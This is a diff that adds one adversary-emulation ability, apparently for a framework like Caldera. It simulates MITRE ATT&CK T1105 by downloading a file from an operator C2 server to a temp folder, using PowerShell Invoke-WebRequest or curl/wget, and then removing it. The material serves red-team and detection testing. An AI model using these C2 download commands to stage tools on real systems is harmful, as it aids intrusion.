@@ -1,0 +1,20 @@
+- id: 5cc81ab8-9449-42bd-b97c-2b1e7b82f982
+  name: Ingress tool transfer
+  description: Downloads a file from the operator C2 to disk over HTTP. Produces a real outbound network connection and a file-write; the content fetched is the benign C2 response. Self-cleans. Windows and Linux.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: |
+          Invoke-WebRequest -Uri "#{server}" -OutFile "$env:TEMP\staged_tool.bin" -UseBasicParsing; Get-Item "$env:TEMP\staged_tool.bin"
+        cleanup: |
+          Remove-Item "$env:TEMP\staged_tool.bin" -Force -ErrorAction SilentlyContinue
+    linux:
+      sh:
+        command: |
+          curl -s -o /tmp/staged_tool.bin "#{server}" || wget -q -O /tmp/staged_tool.bin "#{server}"; ls -l /tmp/staged_tool.bin
+        cleanup: |
+          rm -f /tmp/staged_tool.bin
